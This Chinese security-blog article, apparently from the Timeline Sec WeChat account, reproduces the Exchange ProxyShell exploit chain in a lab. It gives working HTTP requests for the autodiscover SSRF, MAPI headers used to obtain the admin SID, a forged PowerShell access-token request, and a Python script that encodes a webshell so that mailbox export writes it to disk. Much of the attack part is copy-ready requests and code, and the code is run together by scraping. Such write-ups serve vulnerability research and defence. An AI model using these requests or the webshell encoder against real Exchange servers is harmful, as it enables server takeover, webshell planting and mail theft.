##  Exchange ProxyShell 远程代码执行漏洞复现

原创 TLS复现组  [ Timeline Sec ](javascript:void\(0\);)

**Timeline Sec** ![]()

微信号 TimelineSec

功能介绍 学安全必备，专注于最新漏洞复现与分析。（Timeline Sec 网络安全团队官方公众号）

____

__

收录于话题

#漏洞复现文章合集

103个

  

**上方蓝色字体关注我们，一起学安全！** **作者：** **小泫** **@Timeline Sec  
** **本文字数：2923** **阅读时长：8～9min** **声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

  

 **0x01 简介**  
  
  

今年的Blackhat演讲中，Orange Tsai对其在上一阶段对Microsoft Exchange
Server进行的安全研究进行了分享，除了前一段时间已经公开的proxylogon，还带来了ProxyShell等漏洞的有关具体细节。  

  

 **0x02 漏洞概述**  
  
  

ProxyShell是利用了Exchange服务器对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote
PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。

  

 **0x03 影响版本**  
  
  

Microsoft Exchange Server 2010

Microsoft Exchange Server 2013

Microsoft Exchange Server 2016

Microsoft Exchange Server 2019

  

 **0x04 环境搭建**  
  
  

 **Windows Server 2012:**  

https://msdn.itellyou.cn/  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093217.png)  

  

 **Exchange Server 2016：**  

https://www.msdn.hk/html/2015/1579.html  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093218.png)  

  

 **安装教程：**

https://blog.51cto.com/rdsrv/1911356  

  

 **0x05 漏洞复现**  
  
  

1、攻击链第一步要通过SSRF  

请求AutoDiscover服务，获取legacyDn

  * 

    
    
    /autodiscover/autodiscover.json?a=ktacz@ygjnt.jzk/autodiscover/autodiscover.xml

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093220.png)  

  *   *   *   *   *   *   *   * 

    
    
    POST https://192.168.114.12/autodiscover/autodiscover.json?a=ktacz@ygjnt.jzk/autodiscover/autodiscover.xml HTTP/1.1Host: 192.168.114.12Accept-Encoding: identityCookie: Email=autodiscover/autodiscover.json?a=ktacz@ygjnt.jzkContent-Type: text/xmlContent-Length: 316  
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>administrator@kdc.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093222.png)

  

通过如上图  

获取到LegacyDN与proxylogon类似  

  
2、接下来我们要获取500sid的值  
通过mapi/emsmdb 接口进行获取  

加入如下header头body带入LegacyDN的值

    
          *   *   *   *   * 
    
    
    
    X-Requesttype: ConnectX-Clientinfo: {2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}X-Clientapplication: Outlook/15.0.4815.1002X-Requestid: {C715155F-2BE8-44E0-BD34-2960067874C8}:2Content-Type: application/mapi-http

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093223.png)

  

3、但是我们需要通过Powershell去进行下一步攻击  

  

所以我们需要利用sid与username去计算CommonAccessToken，逆向推导比较复杂，exp的脚本中也给出了参考  

  * 

    
    
    https://github.com/dmaasland/proxyshell-poc

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093224.png)

  

将生成的token通过X-CommonAccessToken进行利用  

    
          *   *   *   *   *   * 
    
    
    
    GET https://192.168.114.12/autodiscover/autodiscover.json?a=ktacz@ygjnt.jzk/powershell/?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBVhZG1pbmlzdHJhdG9yQGtkYy5jb21VLFMtMS01LTIxLTU1OTAwNjY3NC0xMjIwNDAyMjE1LTE3MzUyODY4NjEtNTAwRwEAAAAHAAAADFMtMS01LTMyLTU0NEUAAAAA HTTP/1.1Host: 192.168.114.12Accept-Encoding: identityCookie: Email=autodiscover/autodiscover.json?a=ktacz@ygjnt.jzkContent-Type: application/soap+xml;charset=UTF-8Content-Length: 0

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093226.png)

  

4、通过WsMan协议，通过SOAP请求Exchange的Powershell接口发送指令  exp的作者也给出了代码  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093227.png)

  

调用wsman  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093228.png)

  

5、最后就是写入webshell，pst在导出时其使用的加密为类似异或加密模式，也就是说加密在加密就变成了明文，那么只要先使用其加密方法加密一遍我们要写入的webshell，就可以在导出时，获得明文，从而获取webshell

  

使用脚本进行webshell编码

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #!/usr/bin/python#coding: UTF-8  
    import base64import sixfrom io import BytesIO  
    DWORD_SIZE = 4  
    mpbbCrypt = [    65, 54, 19, 98, 168, 33, 110, 187,    244, 22, 204, 4, 127, 100, 232, 93,    30, 242, 203, 42, 116, 197, 94, 53,    210, 149, 71, 158, 150, 45, 154, 136,    76, 125, 132, 63, 219, 172, 49, 182,    72, 95, 246, 196, 216, 57, 139, 231,    35, 59, 56, 142, 200, 193, 223, 37,    177, 32, 165, 70, 96, 78, 156, 251,    170, 211, 86, 81, 69, 124, 85, 0,    7, 201, 43, 157, 133, 155, 9, 160,    143, 173, 179, 15, 99, 171, 137, 75,    215, 167, 21, 90, 113, 102, 66, 191,    38, 74, 107, 152, 250, 234, 119, 83,    178, 112, 5, 44, 253, 89, 58, 134,    126, 206, 6, 235, 130, 120, 87, 199,    141, 67, 175, 180, 28, 212, 91, 205,    226, 233, 39, 79, 195, 8, 114, 128,    207, 176, 239, 245, 40, 109, 190, 48,    77, 52, 146, 213, 14, 60, 34, 50,    229, 228, 249, 159, 194, 209, 10, 129,    18, 225, 238, 145, 131, 118, 227, 151,    230, 97, 138, 23, 121, 164, 183, 220,    144, 122, 92, 140, 2, 166, 202, 105,    222, 80, 26, 17, 147, 185, 82, 135,    88, 252, 237, 29, 55, 73, 27, 106,    224, 41, 51, 153, 189, 108, 217, 148,    243, 64, 84, 111, 240, 198, 115, 184,    214, 62, 101, 24, 68, 31, 221, 103,    16, 241, 12, 25, 236, 174, 3, 161,    20, 123, 169, 11, 255, 248, 163, 192,    162, 1, 247, 46, 188, 36, 104, 117,    13, 254, 186, 47, 181, 208, 218, 61,    20, 83, 15, 86, 179, 200, 122, 156,    235, 101, 72, 23, 22, 21, 159, 2,    204, 84, 124, 131, 0, 13, 12, 11,    162, 98, 168, 118, 219, 217, 237, 199,    197, 164, 220, 172, 133, 116, 214, 208,    167, 155, 174, 154, 150, 113, 102, 195,    99, 153, 184, 221, 115, 146, 142, 132,    125, 165, 94, 209, 93, 147, 177, 87,    81, 80, 128, 137, 82, 148, 79, 78,    10, 107, 188, 141, 127, 110, 71, 70,    65, 64, 68, 1, 17, 203, 3, 63,    247, 244, 225, 169, 143, 60, 58, 249,    251, 240, 25, 48, 130, 9, 46, 201,    157, 160, 134, 73, 238, 111, 77, 109,    196, 45, 129, 52, 37, 135, 27, 136,    170, 252, 6, 161, 18, 56, 253, 76,    66, 114, 100, 19, 55, 36, 106, 117,    119, 67, 255, 230, 180, 75, 54, 92,    228, 216, 53, 61, 69, 185, 44, 236,    183, 49, 43, 41, 7, 104, 163, 14,    105, 123, 24, 158, 33, 57, 190, 40,    26, 91, 120, 245, 35, 202, 42, 176,    175, 62, 254, 4, 140, 231, 229, 152,    50, 149, 211, 246, 74, 232, 166, 234,    233, 243, 213, 47, 112, 32, 242, 31,    5, 103, 173, 85, 16, 206, 205, 227,    39, 59, 218, 186, 215, 194, 38, 212,    145, 29, 210, 28, 34, 51, 248, 250,    241, 90, 239, 207, 144, 182, 139, 181,    189, 192, 191, 8, 151, 30, 108, 226,    97, 224, 198, 193, 89, 171, 187, 88,    222, 95, 223, 96, 121, 126, 178, 138,    71, 241, 180, 230, 11, 106, 114, 72,    133, 78, 158, 235, 226, 248, 148, 83,    224, 187, 160, 2, 232, 90, 9, 171,    219, 227, 186, 198, 124, 195, 16, 221,    57, 5, 150, 48, 245, 55, 96, 130,    140, 201, 19, 74, 107, 29, 243, 251,    143, 38, 151, 202, 145, 23, 1, 196,    50, 45, 110, 49, 149, 255, 217, 35,    209, 0, 94, 121, 220, 68, 59, 26,    40, 197, 97, 87, 32, 144, 61, 131,    185, 67, 190, 103, 210, 70, 66, 118,    192, 109, 91, 126, 178, 15, 22, 41,    60, 169, 3, 84, 13, 218, 93, 223,    246, 183, 199, 98, 205, 141, 6, 211,    105, 92, 134, 214, 20, 247, 165, 102,    117, 172, 177, 233, 69, 33, 112, 12,    135, 159, 116, 164, 34, 76, 111, 191,    31, 86, 170, 46, 179, 120, 51, 80,    176, 163, 146, 188, 207, 25, 28, 167,    99, 203, 30, 77, 62, 75, 27, 155,    79, 231, 240, 238, 173, 58, 181, 89,    4, 234, 64, 85, 37, 81, 229, 122,    137, 56, 104, 82, 123, 252, 39, 174,    215, 189, 250, 7, 244, 204, 142, 95,    239, 53, 156, 132, 43, 21, 213, 119,    52, 73, 182, 18, 10, 127, 113, 136,    253, 157, 24, 65, 125, 147, 216, 88,    44, 206, 254, 36, 175, 222, 184, 54,    200, 161, 128, 166, 153, 152, 168, 47,    14, 129, 101, 115, 228, 194, 162, 138,    212, 225, 17, 208, 8, 139, 42, 242,    237, 154, 100, 63, 193, 108, 249, 236]  
    mpbbR = mpbbCryptmpbbS = mpbbCrypt[256:]mpbbI = mpbbCrypt[512:]  
      
    def cryptpermute(data, encrypt=False):    table = mpbbR if encrypt else mpbbI    tmp = [table[v] for v in data] if six.PY3 else [table[ord(v)] for v in data]    i = 0    buf = bytes(tmp) if six.PY3 else bytearray(tmp)    stream = BytesIO(buf)    while True:        b = stream.read(DWORD_SIZE)        try:            tmp[i] = b[0]            tmp[i + 1] = b[1]            tmp[i + 2] = b[2]            tmp[i + 3] = b[3]            i += DWORD_SIZE        except:            pass        if len(b) != DWORD_SIZE:            break  
        return bytes(tmp) if six.PY3 else ''.join(tmp)  
    if __name__ == "__main__":    webshell = b"d"    v1 = cryptpermute(webshell, False)    b64_data = base64.b64encode(v1).decode()    print("[+] Encode webshell ⬇\n{}\n".format(b64_data))  
        encode_shell = base64.b64decode(b64_data)    decode_shell = cryptpermute(encode_shell, True)    print("[+] Decode webshell ⬇\n{}\n".format(decode_shell.decode()))
    
    
      
    

content下内容为shell编码后再进行base64的内容

    
    
    再后续导出将会还原为原内容  
    

执行 保存邮件草稿请求 导出写shell

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093229.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093230.png)

  

查看文件  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093232.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093233.png)

  

 **0x06 修复方式**  
  
  
  

微软已发布上述3个高危漏洞的安全补丁，腾讯安全专家建议采用Exchange Server 的用户尽快升级修复。

  

    
    
     **参考链接：**

https://github.com/dmaasland/proxyshell-poc  

https://mp.weixin.qq.com/s/aEnoBvibp-gkt3qtcOXqAw

https://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210825093234.png)
**往期回顾**  
  
  
[![]()](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247488093&idx=1&sn=be03e5a47da06023173766bb74ec3fac&chksm=903934ada74ebdbb14d14a3cba9fd2628c7caf757b5972b573c1851dd7765afe5c51ff7fdf11&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20210825093235.png)](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247485649&idx=1&sn=2db933f76a7b7765330a430a44f102b6&chksm=90392e21a74ea737b6af30749919eae542cee9363f2c4284e5d9b7836b3c31bef10c0c1955b3&scene=21#wechat_redirect)  
![](https://gitee.com/fuli009/images/raw/master/public/20210825093236.png)  
![](https://gitee.com/fuli009/images/raw/master/public/20210825093237.png)
**阅读原文看更多复现文章** Timeline Sec 团队  
安全路上，与你并肩前行  
  
  
  
  
  
  
  

  
  
  
  
  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

Exchange ProxyShell 远程代码执行漏洞复现

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

